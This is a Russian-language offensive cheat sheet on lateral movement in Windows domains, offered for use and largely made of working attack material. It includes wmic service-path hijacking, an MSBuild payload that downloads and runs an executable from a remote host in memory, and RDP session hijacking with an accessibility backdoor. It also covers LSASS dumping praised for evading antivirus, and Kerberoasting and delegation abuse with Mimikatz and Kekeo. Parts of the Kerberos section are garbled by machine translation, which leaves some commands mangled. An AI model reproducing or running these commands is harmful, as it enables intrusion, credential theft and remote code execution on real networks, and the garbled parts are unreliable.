## Двигаемся боком 

[что это и для чего](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f) и [основные приемы и трюки](https://habr.com/ru/post/439026/).


*расширяемся по (нашей "наверное") сети !
 
для этого есть прeкрасный [инструмент](https://github.com/Ondrik8/lateral_movement/blob/master/SCShell-master.zip)

Шаг 1: Получите текущее pathName вашей целевой службы, чтобы мы могли восстановить его после запуска нашей команды (в нашем случае XblAuthManager)

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' get pathName`

Шаг 2: Измените pathName на любую команду, которую вы хотите запустить

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe C:\testPayload.xml"`

Шаг 3: Запустите измененный сервис

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call startservice`

Шаг 4. Измените путь службы до ее первоначального значения.

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\system32\svchost.exe -k netsvcs"`

И дабы все обьеденить в одну команду.

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe C:\testPayload.xml" & wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call startservice & wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\system32\svchost.exe -k netsvcs" `

+ testPayload.xml


```markdown

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="DemoClass">
   <ClassExample />
  </Target>
	<UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	<Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
			using System;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;
			using System.IO;
			using System.Net;
			using System.Reflection;
			public class ClassExample :  Task, ITask
			{
				public override bool Execute()
				{
                   		 	using (WebClient client = new WebClient())
                   		 	{
                        			System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
						client.Headers.Add ("user-agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36");
						MemoryStream  ms = new MemoryStream(client.DownloadData("http://IP_ADDRESS/ASSEMBLY_NAME.exe"));
						BinaryReader br = new BinaryReader(ms);
						byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
						ms.Close();
						br.Close();
						Assembly a = Assembly.Load(bin);
						string[] args = new string[] {"ASSEMBLY ARGS GO HERE"};
						try
						{
							a.EntryPoint.Invoke(null, new object[] { args });
						}
						catch
						{
							MethodInfo method = a.EntryPoint;
							if (method != null)
							{
								object o = a.CreateInstance(method.Name);
								method.Invoke(o, null);
							}
						}
					}
					return true;
				}
			}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>


```

\\\\\\\\\\\\\\\\\\\\\\

### [PSexec](https://windowsnotes.ru/cmd/psexec-utilita-dlya-udalennogo-vypolneniya-komand/)

[usage](http://winitpro.ru/index.php/2010/09/22/utilita-psexec-i-udalennoe-upravlenie-sistemami/)

\\\\\\\\\\\\\\\\\\\\\\

### Неограниченное делегирование

[пошаговое руководство](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html) по использованию Impacket и Kerberos для делегирования вашего пути к DA

\\\\\\\\\\\\\\\\\\\\\\

### [Spraykatz](https://github.com/aas-n/spraykatz)
- это инструмент без каких-либо усилий, способный извлекать учетные данные на машинах Windows и в больших средах Active Directory.

\\\\\\\\\\\\\\\\\\\\\\

### [capture_ NTLM_hash](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html)

\\\\\\\\\\\\\\\\\\\\\\

### [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 
используется для извлечения дампа LSASS, который позже перемещается на автономный компьютер с Windows 10 и [анализируется](https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330) с помощью Mimikatz . Это по-прежнему эффективный метод извлечения учетных данных из Windows 10, поскольку ProcDump является двоичным файлом Microsoft и по этому всем антивирусам на него пох... чо радует)))

Пдробно: [TYT](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-dump-ntlm-hashes-crack-windows-passwords-0198268/)

\\\\\\\\\\\\\\\\\\\\\\

### RDP Hijacking

If you have SYSTEM context on a host, you can assume the RDP sessions of other users without credentials using the tscon.exe command.

Gain access to cmd.exe to issue the tscon.exe command over RDP by creating a backdoor with Stickkeys or Utilman. Use scheduled tasks (as SYSTEM) or create a service to execute the desired command.

[RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
```
	# View RDP sessions on system your RDP'd to with administrative permissions
	# Locally
	quser

	# Remote
	quser /server:<servername>

	# Create a service that will swap your SESSIONNAME with the desired disconnected session 
	sc create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#XX" error= "ignore"

	# Start service
	net start sesshijack
	or
	sc start sesshijack
```

Linux to Windows Remoting

  - In windows run
```
    winrm set winrm/config/Service/Auth @{Basic="true"}
    winrm set winrm/config/Service @{AllowUnencrypted="true"}
```

  - In linux run
```
    $cred = Get-Credential
    Enter-PSSession -ComputerName 'winserver1' -Credential $cred -Authentication Basic
```

PowerShell Remoting over SSH
```
    Enter-PSSession -Hostname <IP or FQDN> -Username james -SSHTransport
```    

#### [SharpExec](https://github.com/anthemtotheego/SharpExec)

Examples 
========

Note - All modules require Administrative rights on the target systems
Note - If the user who runs SharpExec has administrative rights to the target system, username/password/domain options on not required.

PSExec Module:

Uploads file from User1's desktop to C:\ on remote system and executes it as NT Authority\System

```SharpExec.exe -m=psexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -f=C:\users\user1\desktop\noPowershell-noargs.exe -e=C:\noPowershell-noargs.exe```

Runs command via cmd.exe on target system as NT Authority\System

```SharpExec.exe -m=psexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -e=C:\Windows\System32\cmd.exe -c="My Args"```

WMI Module:

Uploads file from User1's desktop to C:\ on remote system and executes it as TargetUser

```SharpExec.exe -m=wmi -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -f=C:\users\user1\desktop\noPowershell-noargs.exe -e=C:\noPowershell-noargs.exe```

Runs command via cmd.exe on target system as TargetUser

```SharpExec.exe -m=wmi -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -e=C:\Windows\System32\cmd.exe -c="My Args"```

WMIExec Module:

Starts semi-interactive shell on remote system as TargetUser

```SharpExec.exe -m=wmiexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain```


#### Excel4-DCOM

[Excel4-DCOM](https://github.com/outflanknl/Excel4-DCOM)

PowerShell and Cobalt Strike scripts for lateral movement using Excel 4.0 / XLM macros via DCOM (direct shellcode injection in Excel.exe).


#### SharpCradle

[SharpCradle](https://github.com/anthemtotheego/SharpCradle.git)

SharpCradle is a tool designed to help penetration testers or red teams download and execute .NET binaries into memory.


#### Инструменты:

[Responder](https://github.com/lgandx/Responder)

[ntlmrelayx.py](https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py) 

[MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)

[RunFinger.py](https://github.com/lgandx/Responder/blob/master/tools/RunFinger.py)

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec.git)


#### Demo
https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

https://youtu.be/f9oMVoc2Umc

#### [PivotSuite]https://github.com/FlatL1neAPT/PivotSuite

Ключевая особенность:
Поддерживается прямое и обратное туннелирование TCP
Поддерживается прямой и обратный socks5 прокси-сервер
Поддержка протокола UDP через TCP и TCP через TCP
Поддержка корпоративной прокси-аутентификации (NTLM)
Встроенная функциональность перечисления в сети, например Обнаружение хоста, сканирование портов, выполнение команд ОС
PivotSuite позволяет получить доступ к разным взломанным хостам и их сети одновременно (действует как C & C Server)
Одиночное вращение, двойное вращение и многоуровневое вращение могут выполняться с помощью PivotSuite.
PivotSuite также работает как динамическая переадресация портов SSH, но в обратном направлении.

Преимущество перед другими инструментами:
Не требуется доступ администратора / root на взломанном хосте
PivotSuite также работает, когда взломанный хост находится за межсетевым экраном / NAT, когда разрешено только обратное соединение.
Нет зависимости, кроме стандартных библиотек Python.
Установка не требуется
Порт UDP доступен через TCP

#### ниже из [источника](http://hackerhurricane.blogspot.com/)

```text
ПРИМЕЧАНИЕ. Некоторая информация ниже может быть неточной, поскольку у меня не было доверенный домен настроен в моей домашней лаборатории; так что относитесь к нему с недоверием, но знайте, что команды точны, и единственное, о чем вам следует беспокоиться, это домены в команде.

Ознакомьтесь с информацией об аутентификации Kerberos и о том, как клиентский компьютер связывается с сервером KDC / DC, чтобы получить TGT / TGS, чтобы он мог обращаться к серверу приложений, а также о том, как на каждом этапе

Kerberoast:
- автономное взлом паролей учетной записи службы
- билет сеанса Kerberos (TGS) имеет серверную часть, которая зашифрована паролем хеша учетной записи службы. Это дает возможность запросить билет и сделать перебор в оффлайне.
- учетные записи служб часто игнорируются (пароли редко меняются) и имеют доступ с правами администратора домена.
- хэши паролей учетных записей служб могут быть использованы для создания Серебряных билетов.
- представлен Тимом Медином на DerbyCon 2014.


Мы запрашиваем зашифрованный билет TGT с хешем krbtgt при запросе билета TGS (TGS-REQ).
TGS шифруется с использованием хеш-функции NTLM целевой службы (TGS-REP).
Мы можем запросить TGS в любой службе, и KDC ответит билетом TGT.

- Найти учетные записи служб:
GetUserSPNs
https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1

- PowerView:
Get-NetUser -SPN

Примечание: для приведенной выше команды вы должны знать, какие учетные записи пользователей являются администраторами домена!

- Модуль Active Directory (для поиска учетных записей служб krbtgt и priv).
Get-ADUser -Filter {ServicePrincipalName -ne "$ null"} -Properties ServicePrincipalName

- Запрос тикета:
Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel. Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQL / win2016srv.lethallab.local: SQLEXPRESS"

- запросить билет с помощью PowerView:
Request-SPNTicket

- проверить, был ли предоставлен билет:
klist.exe

- Экспортировать все билеты, используя Mimikatz:
Invoke-Mimikatz -Command '"kerberos :: list / export"'
ls Взломать пароль

учетной записи службы:
python.exe. \ Tgsrepcrack.py. \ Passwords.txt '. \ 2-40a10000-labuser @ MSSQLvc ~ ops-win2016srv.lethallab.local ~ SQLEXPRESS-lethallab.local.kirbi '

Делегирование Kerberos:
- Делегирование Kerberos позволяет "повторно использовать учетные данные конечного пользователя для доступа к ресурсам, размещенным на другом сервере". Как сервер приложений или сервер базы данных. Обычно используется там, где требуется Kerberos Double Hop.
- Олицетворение входящего / аутентифицирующего пользователя необходимо для любого вида делегирования Kerberos.
- Делегирование Kerberos бывает двух типов:
    - Неограниченное (только опция до Server 2003)
    - Ограниченный

Как работает делегирование Kerberos:
- пользователь предоставляет учетные данные контроллеру домена
- DC возвращает TGT
- пользователь запрашивает TGS для веб-службы на веб-сервере
- DC предоставляет TGS.
- пользователь отправляет TGT и TGS на веб-сервер.
- учетная запись службы веб-сервера использует TGT пользователя для запроса TGS для сервера базы данных от DC.
- учетная запись службы веб-сервера подключается к серверу базы данных как пользователь.

Неограниченное делегирование:
если установлено для конкретной учетной записи службы, неограниченное делегирование позволяет делегирование любой службе на этом конкретном компьютере.
Затем учетная запись службы может запрашивать доступ к любой службе в домене, выдавая себя за входящего пользователя (потому что DC поместил TGT пользователя в TGS на шаге 4). В нашем примере учетная запись службы веб-сервера может запрашивать доступ к любой службе в домене как подключающийся к ней пользователь.
Это может быть использовано для повышения привилегий в случае, если мы можем скомпрометировать такую ​​машину, и администратор домена (или другой пользователь с высокими привилегиями) подключится к этой машине.

- Обнаружение компьютеров домена, для которых делегирование без ограничений включено с помощью PowerView:
Get-NetComputer -UnConstrained

- Использование модуля Active Directory:
Get-ADComputer -Filter {TrustedForDelegation -eq $ True}
Get-ADUser -Filter {TrustedForDelegation -eq $ True}

- Нам нужно скомпрометировать сервер, на котором разрешено неограниченное делегирование, и дождаться или обмануть пользователя с высоким уровнем привилегий, чтобы подключиться к коробке. Когда такой пользователь подключен, мы можем экспортировать все заявки, включая TGT этого пользователя, с помощью следующей команды:
Invoke-Mimikatz -Command '"sekurlsa :: tickets / export"'

Примечание: нам нужны права администратора на сервере, где неограниченное делегирование включено!

- билет можно использовать повторно:
Invoke-Mimikatz -Command '"kerberos :: ptt c: \ tickets \ admin.kirbi"'


Ограниченное делегирование:
- Представлено в Server 2008
- как следует из названия, ограниченное делегирование разрешает доступ только к указанным службам на конкретных компьютерах!
- типичный сценарий злоупотребления, когда ученик аутентифицируется с использованием не-Kerberos аутентификации, а протокол Kerberos использует Transition Transition для поддержки единого входа.
- Несколько расширений Kerberos вступают в игру для передачи протокола, но мы не будем их обсуждать.
- Учетная запись службы должна иметь атрибут TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION-T2A4D UserAccountControl.
- учетная запись службы может получить доступ ко всем службам, указанным в ее атрибуте msDS-AllowedToDelegateTo.
- другая интересная проблема заключается в том, что делегирование происходит не только для указанной службы, но и для любой службы, работающей под той же учетной записью. Нет проверки для указанного имени участника-службы.

- Перечислять пользователей и компьютеры с включенным ограниченным делегированием.

- Использование PowerView (dev):.
\ PowerView-Dev.ps1
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

- Использование модуля Active Directory:
Get-AdObject -Filter {msDS-AllowedToDelegateTo -ne "$ null"} -Properties msDS- AllowedToDelegateTo

- нам нужно получить открытый текстовый пароль или NTLM-хэш учетной записи службы. Затем его можно использовать с Kekeo:
https://github.com/gentilkiwi/kekeo/

. \ Asktgt.exe / user: termadmin /domain:lethallab.local / key: abf05c4e729e45781acd30ed80674b1c /ticket:termadmin.kirbi

- сейчас, используя s4u От Kekeo запросите TGS:
\ s4u.exe /tgt:termadmin.kirbi /user:administrator@lethallab.local /service:cifs/ops-sqlsrvone.lethallab.local


- используйте TGS:
Invoke-Mimikatz -команда '"kerberos: Ptt cifs.ops-sqlsrvone.lethallab.local.kirbi"'

ls \\ ops-sqlsrvone.lethallab.local \ C $

- напомним, что делегирование не ограничено SPN, возможно создавать альтернативные билеты.

```
